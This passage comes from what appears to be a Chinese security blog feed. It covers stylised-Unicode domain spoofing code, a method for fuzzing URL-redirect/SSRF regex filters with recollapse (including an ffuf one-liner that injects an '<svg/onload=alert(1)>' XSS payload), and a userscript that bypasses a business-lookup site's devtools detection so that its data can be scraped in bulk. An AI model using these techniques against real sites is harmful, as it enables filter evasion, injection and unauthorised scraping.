class="number">0x1D670</span>),</span><br><span class="line">        <span class="string">&quot;sans&quot;</span>:         (<span class="string">&quot;𝖺&quot;</span>, <span class="string">&quot;𝖠&quot;</span>, <span class="number">0x1D5BA</span>, <span class="number">0x1D5A0</span>),</span><br><span class="line">        <span class="string">&quot;sans_bold&quot;</span>:    (<span class="string">&quot;𝗮&quot;</span>, <span class="string">&quot;𝗔&quot;</span>, <span class="number">0x1D5EE</span>, <span class="number">0x1D5D4</span>),</span><br><span class="line">        <span class="string">&quot;sans_italic&quot;</span>:  (<span class="string">&quot;𝘢&quot;</span>, <span class="string">&quot;𝘈&quot;</span>, <span class="number">0x1D622</span>, <span class="number">0x1D608</span>),</span><br><span class="line">        <span class="string">&quot;sans_bold_italic&quot;</span>: (<span class="string">&quot;𝙖&quot;</span>, <span class="string">&quot;𝘼&quot;</span>, <span class="number">0x1D656</span>, <span class="number">0x1D63C</span>),</span><br><span class="line">        <span class="string">&quot;circled&quot;</span>:      (<span class="string">&quot;ⓐ&quot;</span>, <span class="string">&quot;Ⓐ&quot;</span>, <span class="number">0x24D0</span>, <span class="number">0x24B6</span>),</span><br><span class="line">        <span class="string">&quot;squared&quot;</span>:      (<span class="string">&quot;🄰&quot;</span>, <span class="string">&quot;🄰&quot;</span>, <span class="number">0x1F130</span>, <span class="number">0x1F130</span>),  <span class="comment"># Only A-Z</span></span><br><span class="line">        <span class="string">&quot;superscript&quot;</span>:  (<span class="string">&quot;ᵃ&quot;</span>, <span class="string">&quot;ᴬ&quot;</span>, &#123;</span><br><span class="line">            <span class="string">&quot;a&quot;</span>: <span class="string">&quot;ᵃ&quot;</span>, <span class="string">&quot;b&quot;</span>: <span class="string">&quot;ᵇ&quot;</span>, <span class="string">&quot;c&quot;</span>: <span class="string">&quot;ᶜ&quot;</span>, <span class="string">&quot;d&quot;</span>: <span class="string">&quot;ᵈ&quot;</span>, <span class="string">&quot;e&quot;</span>: <span class="string">&quot;ᵉ&quot;</span>,</span><br><span class="line">            <span class="string">&quot;f&quot;</span>: <span class="string">&quot;ᶠ&quot;</span>, <span class="string">&quot;g&quot;</span>: <span class="string">&quot;ᵍ&quot;</span>, <span class="string">&quot;h&quot;</span>: <span class="string">&quot;ʰ&quot;</span>, <span class="string">&quot;i&quot;</span>: <span class="string">&quot;ⁱ&quot;</span>, <span class="string">&quot;j&quot;</span>: <span class="string">&quot;ʲ&quot;</span>,</span><br><span class="line">            <span class="string">&quot;k&quot;</span>: <span class="string">&quot;ᵏ&quot;</span>, <span class="string">&quot;l&quot;</span>: <span class="string">&quot;ˡ&quot;</span>, <span class="string">&quot;m&quot;</span>: <span class="string">&quot;ᵐ&quot;</span>, <span class="string">&quot;n&quot;</span>: <span class="string">&quot;ⁿ&quot;</span>, <span class="string">&quot;o&quot;</span>: <span class="string">&quot;ᵒ&quot;</span>,</span><br><span class="line">            <span class="string">&quot;p&quot;</span>: <span class="string">&quot;ᵖ&quot;</span>, <span class="string">&quot;r&quot;</span>: <span class="string">&quot;ʳ&quot;</span>, <span class="string">&quot;s&quot;</span>: <span class="string">&quot;ˢ&quot;</span>, <span class="string">&quot;t&quot;</span>: <span class="string">&quot;ᵗ&quot;</span>, <span class="string">&quot;u&quot;</span>: <span class="string">&quot;ᵘ&quot;</span>,</span><br><span class="line">            <span class="string">&quot;v&quot;</span>: <span class="string">&quot;ᵛ&quot;</span>, <span class="string">&quot;w&quot;</span>: <span class="string">&quot;ʷ&quot;</span>, <span class="string">&quot;x&quot;</span>: <span class="string">&quot;ˣ&quot;</span>, <span class="string">&quot;y&quot;</span>: <span class="string">&quot;ʸ&quot;</span>, <span class="string">&quot;z&quot;</span>: <span class="string">&quot;ᶻ&quot;</span></span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="string">&quot;subscript&quot;</span>:    (<span class="string">&quot;ₐ&quot;</span>, <span class="string">&quot;ₐ&quot;</span>, &#123;</span><br><span class="line">            <span class="string">&quot;a&quot;</span>: <span class="string">&quot;ₐ&quot;</span>, <span class="string">&quot;e&quot;</span>: <span class="string">&quot;ₑ&quot;</span>, <span class="string">&quot;h&quot;</span>: <span class="string">&quot;ₕ&quot;</span>, <span class="string">&quot;i&quot;</span>: <span class="string">&quot;ᵢ&quot;</span>, <span class="string">&quot;j&quot;</span>: <span class="string">&quot;ⱼ&quot;</span>,</span><br><span class="line">            <span class="string">&quot;k&quot;</span>: <span class="string">&quot;ₖ&quot;</span>, <span class="string">&quot;l&quot;</span>: <span class="string">&quot;ₗ&quot;</span>, <span class="string">&quot;m&quot;</span>: <span class="string">&quot;ₘ&quot;</span>, <span class="string">&quot;n&quot;</span>: <span class="string">&quot;ₙ&quot;</span>, <span class="string">&quot;o&quot;</span>: <span class="string">&quot;ₒ&quot;</span>,</span><br><span class="line">            <span class="string">&quot;p&quot;</span>: <span class="string">&quot;ₚ&quot;</span>, <span class="string">&quot;r&quot;</span>: <span class="string">&quot;ᵣ&quot;</span>, <span class="string">&quot;s&quot;</span>: <span class="string">&quot;ₛ&quot;</span>, <span class="string">&quot;t&quot;</span>: <span class="string">&quot;ₜ&quot;</span>, <span class="string">&quot;u&quot;</span>: <span class="string">&quot;ᵤ&quot;</span>,</span><br><span class="line">            <span class="string">&quot;v&quot;</span>: <span class="string">&quot;ᵥ&quot;</span>, <span class="string">&quot;x&quot;</span>: <span class="string">&quot;ₓ&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> style <span class="keyword">not</span> <span class="keyword">in</span> styles:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unsupported style.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    lower, upper, *base = styles[style]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> style <span class="keyword">in</span> [<span class="string">&quot;superscript&quot;</span>, <span class="string">&quot;subscript&quot;</span>]:</span><br><span class="line">            mapping = base[<span class="number">0</span>]</span><br><span class="line">            result += mapping.get(char.lower(), char)</span><br><span class="line">        <span class="keyword">elif</span> char.isalpha():</span><br><span class="line">            offset = <span class="built_in">ord</span>(char.lower()) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> char.islower():</span><br><span class="line">                result += <span class="built_in">chr</span>(base[<span class="number">0</span>] + offset)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result += <span class="built_in">chr</span>(base[<span class="number">1</span>] + offset)</span><br><span class="line">        <span class="keyword">elif</span> char == <span class="string">&quot;.&quot;</span> <span class="keyword">and</span> style <span class="keyword">in</span> [<span class="string">&quot;circled&quot;</span>, <span class="string">&quot;squared&quot;</span>]:</span><br><span class="line">            result += <span class="string">&quot;.&quot;</span>  <span class="comment"># Don&#x27;t stylize dot for these styles</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += char</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例：转换为多种风格</span></span><br><span class="line">text = <span class="string">&quot;hello.com&quot;</span></span><br><span class="line"><span class="keyword">for</span> style <span class="keyword">in</span> [<span class="string">&quot;script&quot;</span>, <span class="string">&quot;bold&quot;</span>, <span class="string">&quot;italic&quot;</span>, <span class="string">&quot;bold_italic&quot;</span>, <span class="string">&quot;fraktur&quot;</span>,</span><br><span class="line">              <span class="string">&quot;double&quot;</span>, <span class="string">&quot;monospace&quot;</span>, <span class="string">&quot;sans&quot;</span>, <span class="string">&quot;sans_bold&quot;</span>, <span class="string">&quot;sans_italic&quot;</span>,</span><br><span class="line">              <span class="string">&quot;sans_bold_italic&quot;</span>, <span class="string">&quot;circled&quot;</span>, <span class="string">&quot;squared&quot;</span>, <span class="string">&quot;superscript&quot;</span>, <span class="string">&quot;subscript&quot;</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;style:&gt;<span class="number">20</span>&#125;</span>: <span class="subst">&#123;stylize(text, style)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">          script: 𝒽𝒺𝓁𝓁𝓄.𝒸𝓄𝓂</span><br><span class="line">            bold: 𝐡𝐞𝐥𝐥𝐨.𝐜𝐨𝐦</span><br><span class="line">          italic: 𝑕𝑒𝑙𝑙𝑜.𝑐𝑜𝑚</span><br><span class="line">     bold_italic: 𝒉𝒆𝒍𝒍𝒐.𝒄𝒐𝒎</span><br><span class="line">         fraktur: 𝔥𝔢𝔩𝔩𝔬.𝔠𝔬𝔪</span><br><span class="line">          double: 𝕙𝕖𝕝𝕝𝕠.𝕔𝕠𝕞</span><br><span class="line">       monospace: 𝚑𝚎𝚕𝚕𝚘.𝚌𝚘𝚖</span><br><span class="line">            sans: 𝗁𝖾𝗅𝗅𝗈.𝖼𝗈𝗆</span><br><span class="line">       sans_bold: 𝗵𝗲𝗹𝗹𝗼.𝗰𝗼𝗺</span><br><span class="line">     sans_italic: 𝘩𝘦𝘭𝘭𝘰.𝘤𝘰𝘮</span><br><span class="line">sans_bold_italic: 𝙝𝙚𝙡𝙡𝙤.𝙘𝙤𝙢</span><br><span class="line">         circled: ⓗⓔⓛⓛⓞ.ⓒⓞⓜ</span><br><span class="line">         squared: 🄷🄴🄻🄻🄾.🄲🄾🄼</span><br><span class="line">     superscript: ʰᵉˡˡᵒ.ᶜᵒᵐ</span><br><span class="line">       subscript: ₕₑₗₗₒ.cₒₘ</span><br></pre></td></tr></table></figure>

<p>如果各位爷有特殊需要可以自行参考Unicode编码表：<br><a href="https://www.unicode.org/Public/UNIDATA/UnicodeData.txt">https://www.unicode.org/Public/UNIDATA/UnicodeData.txt</a></p>
<h1 id="正则匹配的FUZZ"><a href="#正则匹配的FUZZ" class="headerlink" title="正则匹配的FUZZ"></a>正则匹配的FUZZ</h1><p>看一个例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://example.com/redirect?url=https://legit.example.com ✅</span><br><span class="line">https://example.com/redirect?url=https://evil.com ❌</span><br></pre></td></tr></table></figure>

<p>我们来思考一个问题，如果这里是SSRF，那我们想自定义URL，可以通过FUZZ来bypass后端的正则：<br><strong>虽然这不是很现实，但并非不能测试</strong><br>我们需要确定一个比较关键的地方，那就是正则的规则，可以通过下面几种方式来思考：</p>
<ul>
<li>确定正则表达式透视位置</li>
</ul>
<p>其中包含：输入的开头和结尾</p>
<ul>
<li>分隔片位置</li>
</ul>
<p>其中包含：特殊字符之前和之后</p>
<ul>
<li>标准化位置</li>
</ul>
<p>其中包含通常元音 <code>ª</code> &gt; <code>a</code></p>
<p>正则起始和结束的位置无非下面几种：<br><img src="/images/Pasted%20image%2020250522100220.png"></p>
<p>当然还可以有更多其他场景的例子：<br><img src="/images/Pasted%20image%2020250522100258.png"></p>
<p>那么我们如何快速FUZZ呢？<br>可以使用此项目：<a href="https://github.com/0xacb/recollapse">https://github.com/0xacb/recollapse</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;a@b.com&quot;</span> | recollapse</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020250522100703.png"></p>
<p>还可以联动下FFUF：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;svg/onload=alert(1)&gt;&quot;</span> | recollapse | ffuf -w - -u <span class="string">&quot;https://example.com/?param=FUZZ&quot;</span> -mc 200,403,500</span><br></pre></td></tr></table></figure>

<p>ok bye～<br>参考地址：<br><a href="https://www.unicode.org/Public/UNIDATA/UnicodeData.txt">https://www.unicode.org/Public/UNIDATA/UnicodeData.txt</a><br><a href="https://shkspr.mobi/blog/2018/11/domain-hacks-with-unusual-unicode-characters/">https://shkspr.mobi/blog/2018/11/domain-hacks-with-unusual-unicode-characters/</a><br><a href="https://home.unicode.org/">https://home.unicode.org/</a><br><a href="https://0xacb.com/2022/11/21/recollapse/">https://0xacb.com/2022/11/21/recollapse/</a></p>
]]></content>
  </entry>
  <entry>
    <title>爱企查Hook BypassDev批量查数据</title>
    <url>/2025/06/05/%E7%88%B1%E4%BC%81%E6%9F%A5Hook-BypassDev%E6%89%B9%E9%87%8F%E6%9F%A5%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<h1 id="爱企查Hook-BypassDev批量查数据"><a href="#爱企查Hook-BypassDev批量查数据" class="headerlink" title="爱企查Hook BypassDev批量查数据"></a>爱企查Hook BypassDev批量查数据</h1><h2 id="需要工具"><a href="#需要工具" class="headerlink" title="需要工具"></a>需要工具</h2><ul>
<li>油猴插件</li>
<li>selenium</li>
</ul>
<h2 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h2><p>打开油猴管理面板，点击左边加号<br><img src="/images/Pasted%20image%2020250408101906.png"></p>
<p>将我的脚本粘贴进去并保存：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         爱企查禁用开发者工具检测</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  绕过页面开发者工具检测逻辑，建议需要时才开启，欢迎关注公众号【z1sec】</span></span><br><span class="line"><span class="comment">// @author       z1</span></span><br><span class="line"><span class="comment">// @match        *://*/*</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// @run-at       document-start</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法一：设置 localStorage 触发忽略条件</span></span><br><span class="line">    <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;devtool&#x27;</span>, <span class="string">&#x27;open&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法二：劫持检测函数配置</span></span><br><span class="line">    <span class="keyword">const</span> originalS = <span class="variable language_">window</span>.<span class="property">s</span>;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">s</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">config</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!config) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 强制忽略所有检测条件</span></span><br><span class="line">            config.<span class="property">ignore</span> = <span class="function">() =&gt;</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 禁用开发者工具打开时的回调</span></span><br><span class="line">            config.<span class="property">ondevtoolopen</span> = <span class="keyword">function</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Devtools detection bypassed&#x27;</span>);</span><br><span class="line">                e = <span class="function">() =&gt;</span> &#123;&#125;; <span class="comment">// 禁用回调函数</span></span><br><span class="line">                <span class="comment">// 移除跳转逻辑</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 禁用定时器清理</span></span><br><span class="line">            config.<span class="property">clearIntervalWhenDevOpenTrigger</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果需要保持原始逻辑可调用原始函数</span></span><br><span class="line">            <span class="comment">// if (originalS) originalS(config);</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法三：防止原型检测（可选）</span></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="variable language_">window</span>, <span class="string">&#x27;console&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">value</span>: <span class="variable language_">console</span>,</span><br><span class="line">        <span class="attr">writable</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">configurable</span>: <span class="literal">false</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>勾选，开启此插件（<strong>注意：不用的时候可以把此插件关闭，可能会影响其他网站正常访问</strong>）<br><img src="/images/Pasted%20image%2020250408102120.png"></p>
<p>访问爱企查<br><img src="/images/Pasted%20image%2020250408102217.png"></p>
<p>此时打开控制台将不受限制<br><img src="/images/Pasted%20image%2020250408102303.png"></p>
<p>接着重新启动你的浏览器，此步骤需要你的环境可以正常使用selenium<br>可以参考：<a href="https://blog.csdn.net/tong117/article/details/118891885">https://blog.csdn.net/tong117/article/details/118891885</a><br>或google搜索：selenium 浏览器debug</p>
<p>我监听的是65003端口<br><img src="/images/Pasted%20image%2020250408102828.png"></p>
<p>启动后跳出浏览器，运行此脚本，如果有模块没安装请自行安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 search.py</span><br></pre></td></tr></table></figure>
<p>输出这个页面说明正常，接着输入你要搜索的名字并回车：<br><img src="/images/Pasted%20image%2020250408103117.png"></p>
<p>此时浏览器开始自动点击搜索：<br><img src="/images/%E6%B5%8F%E8%A7%88%E5%99%A8.gif"><br>命令行会输出：<br><img src="/images/%E5%91%BD%E4%BB%A4%E8%A1%8C.gif"></p>
<p>有的时候百度会让你验证，这个没办法，手动验证下，接着运行脚本跑就行：<br><img src="/images/Pasted%20image%2020250408103704.png"></p>
<p>跑结束或者异常时会停止获取，当前目录下会生成一个out.txt，里面就是搜索结果：<br><img src="/images/Pasted%20image%2020250408104022.png"></p>
<p>我就没写生成csv或者excel了，读者可以自行加功能，对于txt可以直接复制到execl中，使用“|”分列即可：<br><img src="/images/Pasted%20image%2020250408104241.png"><br><img src="/images/Pasted%20image%2020250408104255.png"></p>
<p>这样就分好了：<br><img src="/images/Pasted%20image%2020250408104313.png"></p>
<h2 id="Bypass原理"><a href="#Bypass原理" class="headerlink" title="Bypass原理"></a>Bypass原理</h2><p>其实原理很简单，常规的js逆向，打开控制台直接全部页面制空：<br><img src="/images/Pasted%20image%2020250408104524.png"></p>
<p>然后跳转：about:blank<br><img src="/images/Pasted%20image%2020250408104842.png"></p>
<p>检测控制台的功能在：index.086d760a5f5.js<br><img src="/images/Pasted%20image%2020250408110130.png"></p>
<p>直接把这段置为空即可，返回none<br><img src="/images/Pasted%20image%2020250408110424.png"></p>
<p>此时就可以用控制台了：<br><img src="/images/Pasted%20image%2020250408110459.png"></p>
]]></content>
  </entry>
</search>
